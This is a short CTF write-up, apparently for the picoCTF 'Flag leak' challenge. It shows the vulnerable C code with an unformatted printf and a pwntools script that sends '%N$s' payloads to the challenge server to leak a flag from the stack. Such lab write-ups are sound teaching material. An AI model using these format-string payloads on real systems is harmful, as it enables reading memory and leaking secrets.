---
title: "Flag leak"
date: "2025-07-14"
tags: ["picoCTF", "format string"]
---

```bash
file vuln
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID\[sha1]=17bb7adc72aff4022d6a1c451eb9adcf34df2f8c, for GNU/Linux 3.2.0, not stripped
```

```bash
checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols	 No	0	2	vuln
```

The program gives back whatever you send it.

```c
./vuln
Tell me a story and then I'll tell you one >> hola
Here's a story -
hola
```

The code has a `printf` with no format string, so there is a format string vulnerability and we can leak the stack, for example.

```c
void vuln(){
	char flag\[BUFSIZE];
	char story\[128];
	readflag(flag, FLAGSIZE);
	printf("Tell me a story and then I'll tell you one >> ");
	scanf("%127s", story);
	printf("Here's a story - \n");
	printf(story); // VULN
	printf("\n");
}
```

Since the flag is put on the stack by the `fgets`, we can leak the flag.

```c
void readflag(char* buf, size_t len) {
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your", "own debugging flag.\n");
        exit(0);
    }
    fgets(buf, len, f); // FLAG AL STACK
}
```

We can write a `fuzzer` that fuzzes and pulls out elements 10 to 30, for example, as a string:

```python
from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 62385)
    return r

def main():
    for i in range(10, 30):
        try:
            r = conn()
            r.sendlineafter(b'>', '%{}$s'.format(i).encode())
            r.recvline()
            result = r.recvline()
            print(result)
            r.close()
        except EOFError:
            pass

if __name__ == "__main__":
    main()
```

Connections will open and close, each one showing a different element of the stack, and one of those elements will be the flag.

```c
\[+] Opening connection to saturn.picoctf.net on port 62385: Done
b'CTF{SECRETO}\n'
```
